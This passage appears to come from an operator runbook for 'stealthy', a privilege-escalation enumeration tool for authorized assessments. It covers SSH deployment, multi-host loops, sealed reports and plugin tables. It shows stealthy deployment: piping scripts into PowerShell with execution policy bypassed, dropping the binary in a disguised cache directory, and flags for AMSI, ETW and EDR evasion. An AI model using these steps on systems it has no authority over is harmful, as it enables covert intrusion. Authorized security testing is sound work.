TARGET='user@10.0.0.20'
ssh "$TARGET" 'STEALTHY_AUTHORIZED=1 bash -s' < scripts/linux/enum.sh | tee "linux-enum-$(date +%Y%m%d%H%M%S).txt"
```

### 6.4 Windows script-only one-shot over SSH

```bash
TARGET='user@10.0.0.30'
ssh "$TARGET" 'powershell -NoProfile -ExecutionPolicy Bypass -Command "$env:STEALTHY_AUTHORIZED = '\''1'\''; iex ([Console]::In.ReadToEnd())"' < scripts/windows/enum.ps1 \
  | tee "win-enum-$(date +%Y%m%d%H%M%S).txt"
```

### 6.5 Verify binary before use

```bash
# Linux
sha256sum target/release/stealthy
file target/release/stealthy
./target/release/stealthy --version

# Windows artifact from Linux cross build
sha256sum target/x86_64-pc-windows-gnu/release/stealthy.exe
file target/x86_64-pc-windows-gnu/release/stealthy.exe
```

```powershell
Get-FileHash .\target\release\stealthy.exe -Algorithm SHA256
(Get-Item .\target\release\stealthy.exe).VersionInfo
.\target\release\stealthy.exe --version
```

---

### 6.6 Controlled multi-host execution

Batch operation is useful only when the host list, concurrency, output naming,
and cleanup ownership are explicit. Start sequentially; add concurrency only
when the ROE, target capacity, and monitoring plan allow it.

Create an approved host inventory with one connection target per line. Do not
derive it from a broad network scan in this workflow.

```text
# approved-linux-hosts.txt
user@10.0.0.21
user@10.0.0.22
```

Then use a bounded, fail-visible loop. The explicit `case` check prevents an
accidental empty or wildcard target from becoming a destructive SSH command.

```bash
set -euo pipefail
BIN_LOCAL='target/release/stealthy'
REMOTE='/tmp/.cache-update'
EVIDENCE_DIR='./approved-evidence'
mkdir -p "$EVIDENCE_DIR"

while IFS= read -r TARGET; do
  [[ -z "$TARGET" || "$TARGET" == \#* ]] && continue
  case "$TARGET" in
    *' '*|/*|'') echo "invalid target: $TARGET" >&2; exit 2 ;;
  esac

  SAFE=$(printf '%s' "$TARGET" | tr '@:/' '___')
  echo "== $TARGET =="
  ssh -o BatchMode=yes -o ConnectTimeout=10 "$TARGET" \
    "mkdir -p '$REMOTE' && command -v sha256sum >/dev/null"
  scp "$BIN_LOCAL" "$TARGET:$REMOTE/stealthy"
  ssh "$TARGET" "chmod 750 '$REMOTE/stealthy' && sha256sum '$REMOTE/stealthy'"
  ssh "$TARGET" "STEALTHY_AUTHORIZED=1 '$REMOTE/stealthy' --quiet --format json enum" \
    > "$EVIDENCE_DIR/$SAFE.json" \
    2> "$EVIDENCE_DIR/$SAFE.stderr.txt"
  sha256sum "$EVIDENCE_DIR/$SAFE.json"
done < approved-linux-hosts.txt
```

For each host, verify the returned binary hash against the local artifact,
validate JSON, inspect plugin coverage, and pull or seal evidence before
cleanup. If one host fails, stop the batch unless the ROE explicitly defines
an error-tolerant continuation rule. Do not reuse one host's report key for
another host.

### 6.7 Automation and CI contract

Use machine-readable stdout and keep progress/diagnostics separate:

```bash
set -o pipefail
STEALTHY_AUTHORIZED=1 stealthy --quiet --no-color --format json \
  --output memory enum > findings.json 2> findings.stderr.txt
status=$?

case "$status" in
  0) echo 'scan completed without the selected threshold' ;;
  2) echo 'authorization acknowledgment missing' >&2 ;;
  4) echo 'finding threshold reached; inspect findings.json' >&2 ;;
  *) echo "operational failure: $status" >&2 ;;
esac
exit "$status"
```

Important semantics:

- `--fail-on` evaluates the findings that remain after `--min-severity`; do
  not use a severity filter that hides the condition your gate is intended to
  enforce.
- A successful process can still contain plugin coverage errors. Parse the
  report and fail or escalate when a required plugin has `status: "error"`.
- `--format json`, `markdown`, and `sarif` shape console output. They do not
  make storage encrypted. Use `--output file` without `--plaintext-file` for a
  sealed artifact.
- `--quiet` makes human output silent, but machine formats still print to
  stdout. This is why `--quiet --format json` is suitable for redirection.
- Treat the report schema version as an input contract. If it changes, pin the
  parser or update the integration rather than silently dropping fields.

### 6.8 Decrypt and review sealed reports off-host

Decrypt sealed evidence only on an approved operator workstation. The `report`
subcommand reads the file and key locally; it does not enumerate the host and
does not require the authorization gate.

```bash
OPERATOR_BIN=./target/release/stealthy
SEALED=./approved-evidence/linux-host-a.seal
KEY_FILE=/approved/keys/linux-host-a.key

# Prefer the protected key file from the approved secret store. The resulting
# JSON is plaintext sensitive evidence.
"$OPERATOR_BIN" report "$SEALED" --key-file "$KEY_FILE" --format json \
  > ./approved-evidence/linux-host-a.json
"$OPERATOR_BIN" report "$SEALED" --key-file "$KEY_FILE" --format markdown \
  > ./approved-evidence/linux-host-a.review.md
```

`STEALTHY_KEY_FILE` can provide the same path. `STEALTHY_KEY_HEX` is the
environment-only compatibility value when a protected file is impractical.
Avoid `--key-hex`: it remains accepted for compatibility, but command-line
values may be captured by shell history or process inspection.

Validate that the decoded report's run ID, host, identity, mode, and plugin
coverage match the engagement log. Hash the sealed source and decoded outputs,
then store them under the approved evidence policy. Remove temporary plaintext
copies when review is complete only if retention policy permits; deletion does
not retract copies from backups, transcripts, or endpoint logging systems.

### 6.9 Recovery after interruption or partial failure

If the process is interrupted, treat the run as incomplete until checked:

1. Record the UTC time, host, command, and observed interruption.
2. Check whether a report was fully written and whether its hash can be read.
3. Inspect the approved drop directory for partial binaries, scripts, sealed
   files, plaintext reports, or temporary archives.
4. Confirm no unexpected child process, service, scheduled task, or listener
   remains from the approved workflow.
5. Either resume with a new run ID or close the host as incomplete; do not
   append new output to a partial report.

Linux check:

```bash
ps -eo pid,ppid,user,args | grep -E '[s]tealthy|[e]num\\.(sh|py)' || true
ls -la /tmp/.cache-update 2>/dev/null || true
```

Windows PowerShell check:

```powershell
Get-Process stealthy -ErrorAction SilentlyContinue |
  Select-Object Id, ProcessName, StartTime, Path
Get-ChildItem 'C:\Users\Public\Documents\cache-update' -Force `
  -ErrorAction SilentlyContinue
```

Do not kill or remove unrelated processes or files merely because they share a
name or directory. Resolve the exact artifact against the run log first.

## 7. Plugin cheat sheet

### Linux (`list-plugins` on a Linux build)

| ID | Focus |
| --- | --- |
| `linux.sudo` | sudoers / NOPASSWD / version CVE hints |
| `linux.suid` | SUID/SGID / capabilities |
| `linux.systemd_cron` | Writable units / cron / timers |
| `linux.containers` | docker/podman/containerd/LXD sockets + groups |
| `linux.groups` | docker/lxd/disk and other root-adjacent groups |
| `linux.polkit` | pkexec + writable polkit rules |
| `linux.mounts` | mountinfo hints + writable `/etc/passwd` |
| `linux.ssh_keys` | Readable private keys / weak authorized_keys |
| `linux.path_ld` | Writable PATH / LD_* |
| `linux.kernel_cve` | Kernel version hints (no exploit) |
| `linux.nfs` | exports / NFS mounts |
| `linux.credentials` | shadow / backup / home creds |
| `linux.services` | Writable service configs |
| `linux.wildcard_cron` | Wildcard injection hints |
| `linux.endpoint_controls` | AppArmor / SELinux / noexec / audit-Yama signals |
| `linux.app_control` | Read-only policy, trust, audit, and fixture-validation assessment |

### Windows (`list-plugins` on a Windows build)

| ID | Focus |
| --- | --- |
| `windows.privileges` | Token privileges + Potato-family recommendation |
| `windows.services` | Unquoted / writable services + parent plant dirs |
| `windows.scheduled_tasks` | Task/action-file ACLs plus registry-backed task-object `WRITE_DAC`, `WRITE_OWNER`, and `DELETE` rights |
| `windows.always_install_elevated` | Installer policy |
| `windows.uac` | UAC policy values |
| `windows.dll_hijack` | Search-path writability |
| `windows.credentials` | Unattend / SAM backups / user cred paths |
| `windows.admin_sessions` | Admins (NetAPI) / session hints |
| `windows.env_path` | PATH hijack candidates |
| `windows.autoruns` | Run keys / Startup folders |
| `windows.endpoint_controls` | AppLocker / WDAC / SmartScreen / AMSI / AV-EDR signals |
| `windows.app_control` | Read-only policy, signer, trust, audit, and fixture-validation assessment |

Remember: Linux builds do not contain Windows plugins and vice versa.
Endpoint-control plugins detect constraints and recommend approved script
fallbacks; with `--allow-techniques endpoint-bypass` they also record
alternate-path / approved-fixture validation intent. That ID does not disable,
unhook, or kill AppLocker, WDAC, SmartScreen, AMSI, ETW providers, AppArmor,
or AV/EDR — use `amsi-bypass` / `etw-unhook` / `av-edr-service` with
`--confirm-evasion` when ROE permits (see `docs/techniques.md` and
`docs/evasion.md`).

---

## 8. Exit codes and failure triage

| Code / symptom | Meaning | What to do |
| --- | --- | --- |
| `2` + auth error text | Missing authorization ack | Pass `--i-understand-authorized-use-only` or set `STEALTHY_AUTHORIZED=1` (direct fallbacks require the same acknowledgment) |
| `3` from `doctor` | Readiness check failed | Resolve the reported platform, plugin, permission, or output prerequisite before running |
| `0` with few findings | Healthy quiet host or filtered plugins | Widen `--plugins` or remove `--skip` |
| `permission denied` running binary | No execute bit / mount `noexec` | `chmod +x` or run from executable mount; else use scripts |
| Windows SmartScreen / AppLocker block | Custom `.exe` blocked | Use `enum.ps1` / `enum.js` / approved LOLBIN host |
| `sudo -l` noisy / audited | Expected | Prefer `--profile quiet` (skips sudo helpers) or readable sudoers paths |
| Sealed file present, lost key | Cannot decrypt | If authorized, re-run with `--key-output-path` or `STEALTHY_KEY_OUTPUT_PATH`; protect the new key file as a sensitive credential |

---

## 9. Finding review and disposition

Treat each finding as an observation that needs context, not as an automatic
proof of exploitability. Severity describes potential impact; the report's
`assessments` describe the tool's confidence, applicability, and evidence
quality. Recommendations and heuristic findings require more validation than
direct local observations.

### 9.1 Review order

Review in this order so high-impact results are not lost in a long report:

1. Confirm the report identity, mode, timestamp, and plugin coverage.
2. Check `critical` and `high` findings, then any finding involving readable
   credentials, private keys, or root/SYSTEM-adjacent control paths.
3. Read the `kind`, `noisy`, `leaves_artifacts`, and assessment fields before
   choosing a follow-up.
4. Re-run the smallest relevant plugin set in enumerate-only mode when a result
   is surprising or the state may have changed.
5. Obtain separate approval before any reversible probe. Do not convert a
   recommendation into an exploit attempt merely because its severity is high.

### 9.2 Finding disposition record

For each material finding, add a short entry to the engagement log:

```text
Finding / plugin:           ______________________________
Run ID and host:            ______________________________
Severity / kind:            ______________________________
Confidence / applicability: ______________________________
Read-only evidence:         ______________________________
Validation status:          open / confirmed / not reproduced / limited
Impact and owner:           ______________________________
Approved next action:       none / re-enumerate / reversible probe / escalate
Artifacts or telemetry:     ______________________________
Remediation reference:      ______________________________
```

When a finding is not reproduced, retain the original report and document the
changed identity, plugin scope, permissions, host state, or tool version. Do
not overwrite the original evidence with a later clean run.

### 9.3 Reporting limitations

Call out limitations explicitly in the deliverable:

- A skipped plugin or plugin error reduces coverage.
- Script-only fallbacks emit reduced-coverage schema v2, but do not provide the
  native binary's plugin coverage or evidence depth. Preserve and inspect
  `coverage_mode`, coverage arrays, and `capability_delta`.
- A filtered report shows only findings at or above the selected threshold.
- Running as root/SYSTEM is not equivalent to a standard-user assessment.
- A recommendation or kernel-version hint is not a kernel exploit result.
- A sealed report protects confidentiality and integrity of the blob, but key
  custody and plaintext exports remain operational responsibilities.

## 10. Opsec defaults (recommended)

1. Start with `-q enum` and memory output.
2. Keep `--delay-ms` at default (`50`) or higher on monitored hosts.
3. Avoid reversible probes until findings justify them; prefer exact
   finding-scoped triage approval over blanket `--auto-exploit`.
4. Prefer sealed `--output file` over `--plaintext-file`.
5. Delete drop paths when the check-in ends.
6. Do not open outbound exfil unless the C2 URL is explicitly in ROE.
7. Document every write probe and file drop in the engagement log.

---

## 11. Safety boundary (non-negotiable)

- Authorized assessments only
- Default = enumeration + recommendations
- High-impact families require explicit `--allow-techniques` when ROE permits
- No silent network client in v1 remote mode
- Script fallbacks also enumeration-only by default

If ROE and this runbook conflict, **ROE wins** — reduce scope, do not improvise noisier techniques.
